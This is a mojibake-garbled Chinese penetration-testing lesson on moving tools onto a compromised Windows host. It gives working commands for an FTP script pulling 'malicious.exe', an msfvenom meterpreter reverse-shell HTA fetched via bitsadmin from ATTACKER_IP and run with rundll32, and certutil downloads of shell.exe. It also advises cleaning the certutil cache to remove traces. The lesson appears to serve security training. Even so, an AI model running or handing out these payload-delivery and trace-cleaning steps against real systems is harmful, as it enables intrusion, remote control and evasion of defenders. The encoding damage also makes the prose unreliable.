# è¯¾ç¨‹P59ï¼šç¬¬25å¤©ï¼šWindowsç³»ç»Ÿä¸‹çš„æ–‡ä»¶ä¼ è¾“ ğŸ“â¡ï¸ğŸ’»

![](img/60be7da9a5382862724175ef497e01ed_1.png)

![](img/60be7da9a5382862724175ef497e01ed_3.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ åœ¨Windowsç³»ç»Ÿç¯å¢ƒä¸‹è¿›è¡Œå†…ç½‘æ–‡ä»¶ä¼ è¾“çš„å‡ ç§å¸¸ç”¨æ–¹æ³•ã€‚æŒæ¡è¿™äº›æŠ€æœ¯å¯¹äºæ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨å·¥ä½œè‡³å…³é‡è¦ã€‚

## æ¦‚è¿°

![](img/60be7da9a5382862724175ef497e01ed_5.png)

æ–‡ä»¶ä¼ è¾“æ˜¯å†…ç½‘æ¸—é€ä¸­çš„å¸¸è§éœ€æ±‚ã€‚å½“æˆ‘ä»¬è·å¾—ä¸€ä¸ªåˆå§‹ç«‹è¶³ç‚¹ï¼ˆä¾‹å¦‚ä¸€ä¸ªShellï¼‰åï¼Œé€šå¸¸éœ€è¦å°†å·¥å…·æˆ–Payloadä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä»¥è¿›ä¸€æ­¥è¡ŒåŠ¨ã€‚æœ¬èŠ‚å°†ä»‹ç»ä¸‰ç§åœ¨Windowsç³»ç»Ÿä¸‹å®ç°æ–‡ä»¶ä¼ è¾“çš„æ–¹æ³•ã€‚

![](img/60be7da9a5382862724175ef497e01ed_7.png)

![](img/60be7da9a5382862724175ef497e01ed_9.png)

## FTPæ–‡ä»¶ä¼ è¾“åè®®

![](img/60be7da9a5382862724175ef497e01ed_11.png)

![](img/60be7da9a5382862724175ef497e01ed_13.png)

é¦–å…ˆï¼Œæˆ‘ä»¬ä»‹ç»ä½¿ç”¨FTPåè®®è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚FTPæ˜¯æ ‡å‡†çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼ŒWindowsç³»ç»Ÿé€šå¸¸è‡ªå¸¦FTPå®¢æˆ·ç«¯ã€‚

![](img/60be7da9a5382862724175ef497e01ed_15.png)

![](img/60be7da9a5382862724175ef497e01ed_16.png)

![](img/60be7da9a5382862724175ef497e01ed_17.png)

**æ ¸å¿ƒå‘½ä»¤**ï¼šåœ¨å‘½ä»¤è¡Œä¸­ï¼Œå¯ä»¥ä½¿ç”¨ `ftp` å‘½ä»¤å¯åŠ¨å®¢æˆ·ç«¯ã€‚

![](img/60be7da9a5382862724175ef497e01ed_18.png)

![](img/60be7da9a5382862724175ef497e01ed_20.png)

![](img/60be7da9a5382862724175ef497e01ed_22.png)

![](img/60be7da9a5382862724175ef497e01ed_24.png)

![](img/60be7da9a5382862724175ef497e01ed_26.png)

![](img/60be7da9a5382862724175ef497e01ed_27.png)

![](img/60be7da9a5382862724175ef497e01ed_28.png)

![](img/60be7da9a5382862724175ef497e01ed_29.png)

ä»¥ä¸‹æ˜¯åˆ©ç”¨FTPä»æ”»å‡»æœºä¸‹è½½æ–‡ä»¶åˆ°ç›®æ ‡æœºçš„æ­¥éª¤ï¼š

![](img/60be7da9a5382862724175ef497e01ed_31.png)

![](img/60be7da9a5382862724175ef497e01ed_32.png)

![](img/60be7da9a5382862724175ef497e01ed_34.png)

![](img/60be7da9a5382862724175ef497e01ed_35.png)

![](img/60be7da9a5382862724175ef497e01ed_37.png)

![](img/60be7da9a5382862724175ef497e01ed_38.png)

![](img/60be7da9a5382862724175ef497e01ed_39.png)

![](img/60be7da9a5382862724175ef497e01ed_41.png)

1.  åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨Pythonå¿«é€Ÿæ­å»ºä¸€ä¸ªFTPæœåŠ¡å™¨ã€‚
    ```bash
    python3 -m pyftpdlib -p 2121
    ```
2.  åœ¨å·²è·å¾—Shellçš„ç›®æ ‡æœºä¸Šï¼Œç¼–å†™ä¸€ä¸ªFTPè„šæœ¬æ–‡ä»¶ã€‚
    ```batch
    echo open 192.168.1.100 2121 > ftp.txt
    echo anonymous >> ftp.txt
    echo >> ftp.txt
    echo get malicious.exe >> ftp.txt
    echo quit >> ftp.txt
    ```
3.  åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œè¯¥è„šæœ¬ï¼Œè‡ªåŠ¨è¿æ¥FTPæœåŠ¡å™¨å¹¶ä¸‹è½½æ–‡ä»¶ã€‚
    ```batch
    ftp -s:ftp.txt
    ```

![](img/60be7da9a5382862724175ef497e01ed_43.png)

![](img/60be7da9a5382862724175ef497e01ed_45.png)

![](img/60be7da9a5382862724175ef497e01ed_47.png)

**æ³¨æ„äº‹é¡¹**ï¼šFTPæœåŠ¡è‹¥é…ç½®ä¸å½“ï¼ˆå¦‚å…è®¸åŒ¿åç™»å½•ä¸”ç›®å½•æƒé™è¿‡å¤§ï¼‰ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ã€‚

![](img/60be7da9a5382862724175ef497e01ed_49.png)

![](img/60be7da9a5382862724175ef497e01ed_51.png)

![](img/60be7da9a5382862724175ef497e01ed_53.png)

## Bitsadminå‘½ä»¤è¡Œå·¥å…·

![](img/60be7da9a5382862724175ef497e01ed_55.png)

![](img/60be7da9a5382862724175ef497e01ed_57.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†FTPï¼Œæœ¬èŠ‚æˆ‘ä»¬æ¥çœ‹çœ‹Windowsè‡ªå¸¦çš„å¦ä¸€ä¸ªå¼ºå¤§å·¥å…·â€”â€”Bitsadminã€‚å®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºã€ç›‘è§†å’Œç®¡ç†æ–‡ä»¶ä¸‹è½½/ä¸Šä¼ ä½œä¸šã€‚

![](img/60be7da9a5382862724175ef497e01ed_59.png)

![](img/60be7da9a5382862724175ef497e01ed_61.png)

ä»¥ä¸‹æ˜¯ä½¿ç”¨Bitsadminä¸‹è½½è¿œç¨‹æ–‡ä»¶çš„æ­¥éª¤ï¼š

![](img/60be7da9a5382862724175ef497e01ed_63.png)

![](img/60be7da9a5382862724175ef497e01ed_65.png)

![](img/60be7da9a5382862724175ef497e01ed_67.png)

1.  é¦–å…ˆï¼Œåœ¨æ”»å‡»æœºä¸Šç”Ÿæˆä¸€ä¸ªæ¶æ„Payloadï¼ˆä¾‹å¦‚ä¸€ä¸ªHTAæ–‡ä»¶ï¼‰ã€‚
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f hta-psh -o shell.hta
    ```
2.  å°†è¯¥æ–‡ä»¶æ”¾ç½®åœ¨æ”»å‡»æœºå¯é€šè¿‡HTTPè®¿é—®çš„ç›®å½•ï¼ˆå¦‚WebæœåŠ¡å™¨æ ¹ç›®å½•ï¼‰ã€‚
3.  åœ¨ç›®æ ‡æœºçš„Shellä¸­ï¼Œä½¿ç”¨Bitsadminå‘½ä»¤ä¸‹è½½è¯¥æ–‡ä»¶ã€‚
    ```batch
    bitsadmin /transfer myjob /download /priority high http://ATTACKER_IP/shell.hta C:\Windows\Temp\shell.hta
    ```
4.  æ–‡ä»¶ä¸‹è½½å®Œæˆåï¼Œä½¿ç”¨`rundll32`æ‰§è¡ŒHTAæ–‡ä»¶ä»¥åå¼¹Shellã€‚
    ```batch
    rundll32.exe url.dll, OpenURL C:\Windows\Temp\shell.hta
    ```

![](img/60be7da9a5382862724175ef497e01ed_69.png)

![](img/60be7da9a5382862724175ef497e01ed_71.png)

**å‘½ä»¤è§£æ**ï¼š`/transfer` å‚æ•°ç”¨äºåˆ›å»ºä¼ è¾“ä½œä¸šï¼Œ`myjob`æ˜¯ä½œä¸šåç§°ï¼Œ`/download`æŒ‡å®šä¸ºä¸‹è½½æ“ä½œï¼Œåé¢è·Ÿéšè¿œç¨‹URLå’Œæœ¬åœ°ä¿å­˜è·¯å¾„ã€‚

![](img/60be7da9a5382862724175ef497e01ed_73.png)

## Certutilè¯ä¹¦å·¥å…·

![](img/60be7da9a5382862724175ef497e01ed_75.png)

![](img/60be7da9a5382862724175ef497e01ed_77.png)

![](img/60be7da9a5382862724175ef497e01ed_79.png)

![](img/60be7da9a5382862724175ef497e01ed_81.png)

![](img/60be7da9a5382862724175ef497e01ed_83.png)

é™¤äº†Bitsadminï¼ŒWindowsç³»ç»Ÿè¿˜è‡ªå¸¦ä¸€ä¸ªåä¸ºCertutilçš„å·¥å…·ï¼Œå®ƒæœ¬æ˜¯ç”¨äºç®¡ç†è¯ä¹¦çš„å‘½ä»¤è¡Œç¨‹åºï¼Œä½†ä¹Ÿå¯è¢«ç”¨æ¥ä¸‹è½½æ–‡ä»¶ã€‚

![](img/60be7da9a5382862724175ef497e01ed_84.png)

![](img/60be7da9a5382862724175ef497e01ed_85.png)

![](img/60be7da9a5382862724175ef497e01ed_86.png)

ä»¥ä¸‹æ˜¯ä½¿ç”¨Certutilä¸‹è½½æ–‡ä»¶çš„æ–¹æ³•ï¼š

1.  åœ¨ç›®æ ‡æœºçš„Shellä¸­ï¼Œç›´æ¥ä½¿ç”¨Certutilå‘½ä»¤ä¸‹è½½è¿œç¨‹æ–‡ä»¶ã€‚
    ```batch
    certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe
    ```
2.  å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œæ–‡ä»¶å³è¢«ä¸‹è½½åˆ°æŒ‡å®šè·¯å¾„ã€‚

![](img/60be7da9a5382862724175ef497e01ed_88.png)

![](img/60be7da9a5382862724175ef497e01ed_90.png)

**é‡è¦æé†’**ï¼šä½¿ç”¨Certutilä¸‹è½½æ–‡ä»¶åï¼Œä¼šåœ¨ä»¥ä¸‹ç›®å½•ç•™ä¸‹ç¼“å­˜ï¼š
`C:\Users\[ç”¨æˆ·å]\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
æ¸—é€æµ‹è¯•å®Œæˆåï¼Œåº”æ³¨æ„æ¸…ç†ç›¸å…³ç—•è¿¹ã€‚

![](img/60be7da9a5382862724175ef497e01ed_92.png)

![](img/60be7da9a5382862724175ef497e01ed_94.png)

![](img/60be7da9a5382862724175ef497e01ed_96.png)

![](img/60be7da9a5382862724175ef497e01ed_98.png)

## æ€»ç»“

![](img/60be7da9a5382862724175ef497e01ed_100.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†åœ¨Windowsç³»ç»Ÿä¸‹è¿›è¡Œå†…ç½‘æ–‡ä»¶ä¼ è¾“çš„ä¸‰ç§æ–¹æ³•ï¼š
1.  **åˆ©ç”¨FTPåè®®**ï¼šé€šè¿‡æ­å»ºç®€æ˜“FTPæœåŠ¡å™¨å’Œç¼–å†™è„šæœ¬å®ç°è‡ªåŠ¨åŒ–ä¸‹è½½ã€‚
2.  **ä½¿ç”¨Bitsadminå·¥å…·**ï¼šåˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦å·¥å…·åˆ›å»ºä¸‹è½½ä½œä¸šï¼Œé€‚åˆä¸‹è½½åç›´æ¥æ‰§è¡ŒPayloadã€‚
3.  **åˆ©ç”¨Certutilç¨‹åº**ï¼šå€ŸåŠ©è¯ä¹¦ç®¡ç†å·¥å…·çš„åŠŸèƒ½å®ç°æ–‡ä»¶ä¸‹è½½ï¼Œä½†ä¼šç•™ä¸‹ç¼“å­˜ç—•è¿¹ã€‚

![](img/60be7da9a5382862724175ef497e01ed_102.png)

![](img/60be7da9a5382862724175ef497e01ed_104.png)

æ¯ç§æ–¹æ³•éƒ½æœ‰å…¶é€‚ç”¨åœºæ™¯ï¼Œåœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç¯å¢ƒçš„å…·ä½“æƒ…å†µï¼ˆå¦‚ç½‘ç»œç­–ç•¥ã€å·¥å…·å¯ç”¨æ€§ï¼‰çµæ´»é€‰æ‹©å’Œç»„åˆä½¿ç”¨ã€‚ç†è§£è¿™äº›åŸºæœ¬åŸç†æ˜¯è¿›è¡Œæœ‰æ•ˆå†…ç½‘æ¸—é€çš„åŸºç¡€ã€‚